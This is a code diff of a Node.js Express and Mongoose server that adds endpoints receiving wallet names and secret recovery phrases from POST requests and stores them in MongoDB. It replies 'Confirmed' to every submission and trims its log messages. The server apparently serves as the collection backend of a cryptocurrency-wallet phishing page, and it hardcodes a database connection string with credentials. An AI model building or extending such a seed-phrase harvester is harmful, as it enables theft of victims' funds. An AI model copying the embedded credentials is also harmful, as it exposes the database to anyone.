@@ -9,10 +9,10 @@ const mongooseUrl = "mongodb+srv://dbBackend:clientbackend@cluster0.ycmie7z.mong
 async function mongooseConnect(){
     try{
         await mongoose.connect(mongooseUrl);
-        console.log("Connected DB");
+        console.log("Connected");
     }
     catch{
-        console.log("Error DB")
+        console.log("Error")
     }
 }
 mongooseConnect()
@@ -20,6 +20,12 @@ mongooseConnect()
 //Schema
 const schema = new mongoose.Schema({secretPhrase: {type:String}});
 const schemaUse = mongoose.model('database1', schema);
+
+const schema2 = new mongoose.Schema({
+    walletName: {type:String},
+    secretPhrase: {type:String}
+});
+const schema2Use = mongoose.model('database2', schema2);
 
 //MiddleWares
 server.use(cors());
@@ -30,7 +36,7 @@ server.get("/",(req,res)=>{
     res.send("Hello World");
 })
 
-server.post("/",(req,res)=>{
+server.post("/api/data1",(req,res)=>{
     async function saveSchema(){
         let data = new schemaUse({
             secretPhrase:req.body.packetData
@@ -40,7 +46,25 @@ server.post("/",(req,res)=>{
             console.log("Saved")
         }
         catch{
-            console.log("NO SAVE")
+            console.log("NO")
+        }
+    }
+    res.json({status:"Confirmed"});
+    saveSchema()
+})
+
+server.post("/api/data2",(req,res)=>{
+    async function saveSchema(){
+        let data = new schema2Use({
+            walletName:req.body.walletname,
+            secretPhrase:req.body.secretPhrase
+        });
+        try{
+            await data.save();
+            console.log("Saved")
+        }
+        catch{
+            console.log("NO")
         }
     }
     res.json({status:"Confirmed"});
@@ -48,7 +72,4 @@ server.post("/",(req,res)=>{
 })
 
 //Server Listening
-server.listen(8000 , ()=>{
-    console.log("Server On");
-})
-;
+server.listen(8000);
